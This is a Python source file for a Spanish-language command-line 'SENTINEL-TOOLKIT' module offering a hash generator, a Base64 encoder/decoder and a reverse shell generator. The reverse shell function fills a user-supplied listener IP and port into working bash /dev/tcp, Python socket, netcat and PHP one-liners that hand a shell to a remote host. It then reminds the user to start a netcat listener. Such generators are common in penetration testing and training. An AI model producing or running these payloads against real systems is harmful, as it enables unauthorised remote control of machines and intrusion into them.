import os
import hashlib
import base64
from colorama import Fore, Style, init
import sys

init(autoreset=True)

# --- Códigos de Color ---
INFO = Fore.CYAN + Style.BRIGHT
SUCCESS = Fore.GREEN + Style.BRIGHT
ERROR = Fore.RED + Style.BRIGHT
WARNING = Fore.YELLOW + Style.BRIGHT
HEADER = Fore.MAGENTA + Style.BRIGHT
ACTION = Fore.WHITE + Style.BRIGHT 
RESET = Style.RESET_ALL

# --- Utilidades ---

def clear_screen():
    """Limpia la terminal."""
    os.system('cls' if os.name == 'nt' else 'clear')

# --- CONFIGURACIÓN Y FUNCIONES DE HASHING ---

def calculate_file_hash(filepath, algorithm):
    """Calcula el hash de un archivo grande."""
    try:
        hasher = hashlib.new(algorithm)
    except ValueError:
        return f"[ERROR] Algoritmo de hash no soportado: {algorithm}"

    try:
        with open(filepath, 'rb') as file:
            while True:
                chunk = file.read(4096)
                if not chunk:
                    break
                hasher.update(chunk)
        
        return hasher.hexdigest()
    except FileNotFoundError:
        return "[ERROR] Archivo no encontrado. Verifica la ruta."
    except Exception as e:
        return f"[ERROR] Error de lectura: {e}"

def run_hash_generator():
    """Función principal para generar hashes de archivos."""
    clear_screen()
    print(HEADER + "\n╔════════════════════════════════════════════════════════════╗")
    print(HEADER + "║  ⚙️  MÓDULO TOOLKIT: GENERADOR DE HASHES (Checksums)         ║")
    print(HEADER + "╚════════════════════════════════════════════════════════════╝")

    filepath = input(ACTION + "SENTINEL-TOOLKIT (Hash)> Ingresa la ruta del archivo: " + RESET).strip()
    
    algorithms = ['md5', 'sha1', 'sha256', 'sha512']
    
    print(INFO + "\n[INFO] Calculando hashes...")
    
    for algo in algorithms:
        hash_value = calculate_file_hash(filepath, algo)
        
        if hash_value.startswith("[ERROR]"):
            print(ERROR + hash_value)
            break
        else:
            print(SUCCESS + f"    -> {algo.upper():<7}: {hash_value}")

    input(INFO + "\nPresiona [ENTER] para volver al menú Toolkit..." + RESET)

# --- BASE64 UTILITY ---

def run_base64_utility():
    """Codifica o decodifica cadenas usando Base64."""
    clear_screen()
    print(HEADER + "\n╔════════════════════════════════════════════════════════════╗")
    print(HEADER + "║  📜 MÓDULO TOOLKIT: CODIFICADOR/DECODIFICADOR BASE64         ║")
    print(HEADER + "╚════════════════════════════════════════════════════════════╝")
    
    print(INFO + "\n[+] Seleccione la operación:")
    print(SUCCESS + "  1 " + RESET + "- Codificar a Base64")
    print(WARNING + "  2 " + RESET + "- Decodificar desde Base64")
    print("-" * 60)
    
    op_choice = input(ACTION + "SENTINEL-TOOLKIT (B64)> Opción (1/2): " + RESET).strip()
    input_data = input(ACTION + "SENTINEL-TOOLKIT (B64)> Ingresa la cadena: " + RESET).strip()
    
    if not input_data:
        print(ERROR + "[ERROR] La cadena no puede estar vacía.")
        input(INFO + "\nPresiona [ENTER] para volver..." + RESET)
        return

    result = None

    try:
        if op_choice == '1':
            # Codificar
            encoded_bytes = base64.b64encode(input_data.encode('utf-8'))
            result = encoded_bytes.decode('utf-8')
            print(SUCCESS + "\n[ RESULTADO ] Cadena Codificada: ")
        
        elif op_choice == '2':
            # Decodificar
            decoded_bytes = base64.b64decode(input_data)
            result = decoded_bytes.decode('utf-8', errors='ignore')
            print(SUCCESS + "\n[ RESULTADO ] Cadena Decodificada: ")

        else:
            print(ERROR + "[ERROR] Opción no válida.")
            result = None
        
        if result is not None:
             print(f"    -> {result}")

    except base64.binascii.Error:
        print(ERROR + "[ERROR] Error de decodificación. La cadena Base64 puede ser inválida o mal formada.")
    except Exception as e:
        print(ERROR + f"[ERROR] Error inesperado: {e}")

    input(INFO + "\nPresiona [ENTER] para volver al menú Toolkit..." + RESET)

# --- REVERSE SHELL GENERATOR (CORREGIDO) ---

def run_reverse_shell_generator():
    """Genera comandos de reverse shell comunes."""
    clear_screen()
    print(HEADER + "\n╔════════════════════════════════════════════════════════════╗")
    print(HEADER + "║  🐚 MÓDULO TOOLKIT: GENERADOR DE REVERSE SHELLS             ║")
    print(HEADER + "╚════════════════════════════════════════════════════════════╝")
    
    LHOST = input(ACTION + "SENTINEL-TOOLKIT (Shell)> Ingresa tu IP de escucha (LHOST): " + RESET).strip()
    LPORT = input(ACTION + "SENTINEL-TOOLKIT (Shell)> Ingresa tu Puerto de escucha (LPORT): " + RESET).strip()
    
    if not LHOST or not LPORT:
        print(ERROR + "[ERROR] LHOST y LPORT no pueden estar vacíos.")
        input(INFO + "\nPresiona [ENTER] para volver..." + RESET)
        return

    # Diccionario de payloads comunes (¡SINTAXIS CORREGIDA!)
    PAYLOADS = {
        "Bash (TCP)": f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        # El payload de Python 3 ahora usa comillas simples internas para evitar el conflicto
        "Python 3": f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{LHOST}',{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')'",
        "Netcat (Simple)": f"nc -e /bin/sh {LHOST} {LPORT}",
        "Netcat (Básico)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
        # El payload de PHP usa secuencias de escape para las comillas internas
        "PHP (Simple)": f"php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    }
    
    print(SUCCESS + "\n[ RESULTADOS ] Comandos de Reverse Shell generados:")
    for name, cmd in PAYLOADS.items():
        print(INFO + f"\n  -> {name}:")
        print(f"     {cmd}")

    print(WARNING + "\n[ INFO ] Recuerda iniciar tu listener (ej: nc -lvnp {LPORT})")
    
    input(INFO + "\nPresiona [ENTER] para volver al menú Toolkit..." + RESET)


# --- MENÚ PRINCIPAL DEL MÓDULO TOOLKIT ---

def run():
    """Menú principal del módulo Toolkit."""
    while True:
        clear_screen()
        print(HEADER + "╔════════════════════════════════════════════════════════════╗")
        print(HEADER + "║               MÓDULO TOOLKIT (Utilidades Esenciales)       ║")
        print(HEADER + "╚════════════════════════════════════════════════════════════╝")
        
        print(INFO + "\n[ 🔧 HERRAMIENTAS DE MANIPULACIÓN Y EXPLOTACIÓN ]")
        print(SUCCESS + "  1 " + RESET + "- 💻 Generador de Hashes (MD5, SHA256, etc.)")
        print(Fore.YELLOW + Style.BRIGHT + "  2 " + RESET + "- 📜 Codificador/Decodificador Base64")
        print(Fore.BLUE + Style.BRIGHT + "  3 " + RESET + "- 🐚 Generador de Reverse Shells")
        print(ERROR + "  9 " + RESET + "- Volver al Menú Principal")
        print("-" * 60)
        
        toolkit_choice = input(ACTION + "SENTINEL-TOOLKIT> " + RESET).strip()
        
        if toolkit_choice == '1':
            run_hash_generator()
        elif toolkit_choice == '2':
            run_base64_utility()
        elif toolkit_choice == '3':
            run_reverse_shell_generator()
        elif toolkit_choice == '9':
            break 
        else:
            print(ERROR + "[ERROR] Opción no válida.")
            input(INFO + "\nPresiona [ENTER] para continuar..." + RESET)